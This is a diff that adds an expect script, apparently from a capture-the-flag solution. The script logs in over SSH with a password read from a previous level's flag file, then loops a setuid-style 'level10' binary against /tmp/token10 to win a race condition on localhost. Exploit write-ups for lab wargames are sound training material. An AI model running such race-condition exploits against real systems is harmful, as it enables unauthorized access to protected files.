@@ -1,0 +1,18 @@
+#!/usr/bin/expect
+
+set ip [ lindex $argv 0 ]
+set port [ lindex $argv 1 ]
+set level [ lindex $argv 2 ]
+set password [ exec cat "../../flag09/flag" ]
+
+spawn ssh "$level\@$ip" "-p $port"
+
+expect "password:" { send "$password\r" }
+
+expect -re {\$ $}
+	send "while :; do nice -n 20 /home/user/level10/level10 /tmp/token10 127.0.0.1; done\r"
+
+expect "Connecting to 127.0.0.1:6969 .. Unable to connect to host 127.0.0.1"
+	send "\x03"
+
+interact
